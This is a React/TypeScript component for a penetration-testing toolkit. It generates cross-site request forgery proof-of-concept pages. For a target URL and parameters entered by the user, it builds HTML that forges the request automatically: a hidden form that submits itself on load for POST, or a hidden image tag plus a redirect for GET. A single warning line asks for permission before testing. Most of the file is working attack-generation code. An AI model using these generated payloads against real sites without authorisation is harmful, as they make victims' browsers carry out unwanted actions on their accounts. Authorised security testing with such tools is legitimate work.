import { useState } from "react";
import CyberpunkCard from "@/components/CyberpunkCard";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Copy, Plus, Trash2, Zap } from "lucide-react";

interface Param {
  key: string;
  value: string;
}

const CSRFPoCGenerator = () => {
  const [targetURL, setTargetURL] = useState("");
  const [method, setMethod] = useState<"GET" | "POST">("POST");
  const [params, setParams] = useState<Param[]>([{ key: "", value: "" }]);
  const [generated, setGenerated] = useState("");
  const [copied, setCopied] = useState(false);

  const addParam = () => setParams([...params, { key: "", value: "" }]);
  const removeParam = (i: number) => setParams(params.filter((_, idx) => idx !== i));
  const updateParam = (i: number, field: "key" | "value", val: string) => {
    const next = [...params];
    next[i][field] = val;
    setParams(next);
  };

  const generate = () => {
    const validParams = params.filter((p) => p.key);
    let html = "";

    if (method === "POST") {
      const inputs = validParams
        .map(
          (p) =>
            `    <input type="hidden" name="${escapeHtml(p.key)}" value="${escapeHtml(p.value)}" />`
        )
        .join("\n");

      html = `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body onload="document.getElementById('csrf-form').submit()">
  <form id="csrf-form" action="${escapeHtml(targetURL)}" method="POST">
${inputs}
    <input type="submit" value="Submit" />
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>`;
    } else {
      const qs = validParams.map((p) => `${encodeURIComponent(p.key)}=${encodeURIComponent(p.value)}`).join("&");
      const fullURL = qs ? `${targetURL}?${qs}` : targetURL;
      html = `<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <img src="${escapeHtml(fullURL)}" style="display:none" />
  <script>
    window.location = '${fullURL.replace(/'/g, "\\'")}';
  </script>
</body>
</html>`;
    }

    setGenerated(html);
  };

  const escapeHtml = (s: string) =>
    s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");

  const handleCopy = () => {
    navigator.clipboard.writeText(generated).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    });
  };

  return (
    <CyberpunkCard title="CSRF POC GENERATOR">
      <div className="space-y-5">
        <div>
          <label className="block text-xs text-cyber-cyan tracking-wider mb-2">TARGET URL</label>
          <Input
            value={targetURL}
            onChange={(e) => setTargetURL(e.target.value)}
            placeholder="https://example.com/action"
            className="bg-black/50 border-cyber-cyan/30 text-cyber-cyan"
          />
        </div>

        <div>
          <label className="block text-xs text-cyber-cyan tracking-wider mb-2">HTTP METHOD</label>
          <div className="flex gap-2">
            {(["GET", "POST"] as const).map((m) => (
              <button
                key={m}
                onClick={() => setMethod(m)}
                className={`px-4 py-2 rounded text-sm font-bold transition-colors ${
                  method === m
                    ? "bg-cyber-red text-white"
                    : "bg-cyber-cyan/20 text-cyber-cyan border border-cyber-cyan/30 hover:bg-cyber-cyan/30"
                }`}
              >
                {m}
              </button>
            ))}
          </div>
        </div>

        <div>
          <div className="flex items-center justify-between mb-2">
            <label className="text-xs text-cyber-cyan tracking-wider">PARAMETERS</label>
            <Button onClick={addParam} size="sm"
              className="bg-cyber-cyan/20 hover:bg-cyber-cyan/30 text-cyber-cyan border border-cyber-cyan/30 text-xs">
              <Plus className="w-3 h-3 mr-1" />Add Param
            </Button>
          </div>
          <div className="space-y-2">
            {params.map((p, i) => (
              <div key={i} className="flex gap-2">
                <Input
                  value={p.key}
                  onChange={(e) => updateParam(i, "key", e.target.value)}
                  placeholder="key"
                  className="bg-black/50 border-cyber-cyan/30 text-cyber-cyan flex-1"
                />
                <Input
                  value={p.value}
                  onChange={(e) => updateParam(i, "value", e.target.value)}
                  placeholder="value"
                  className="bg-black/50 border-cyber-cyan/30 text-cyber-cyan flex-1"
                />
                <Button
                  onClick={() => removeParam(i)}
                  size="sm"
                  disabled={params.length === 1}
                  className="bg-red-500/20 hover:bg-red-500/30 text-red-400 border border-red-500/30"
                >
                  <Trash2 className="w-3 h-3" />
                </Button>
              </div>
            ))}
          </div>
        </div>

        <Button
          onClick={generate}
          disabled={!targetURL}
          className="w-full bg-cyber-red hover:bg-cyber-red/80 text-white font-bold"
        >
          <Zap className="w-4 h-4 mr-2" />
          GENERATE POC
        </Button>

        {generated && (
          <div className="glass-panel rounded p-4">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-cyber-cyan font-bold tracking-wide">GENERATED HTML</h3>
              <Button onClick={handleCopy} size="sm"
                className="bg-cyber-cyan/20 hover:bg-cyber-cyan/30 text-cyber-cyan border border-cyber-cyan/30 text-xs">
                <Copy className="w-3 h-3 mr-1" />{copied ? "Copied!" : "Copy"}
              </Button>
            </div>
            <pre className="text-xs text-green-400 font-mono overflow-x-auto whitespace-pre-wrap break-all bg-black/40 rounded p-3">
              {generated}
            </pre>
            <p className="text-xs text-yellow-400/70 mt-2">
              This form auto-submits when opened in a browser. Use only on systems you have permission to test.
            </p>
          </div>
        )}
      </div>
    </CyberpunkCard>
  );
};

export default CSRFPoCGenerator;
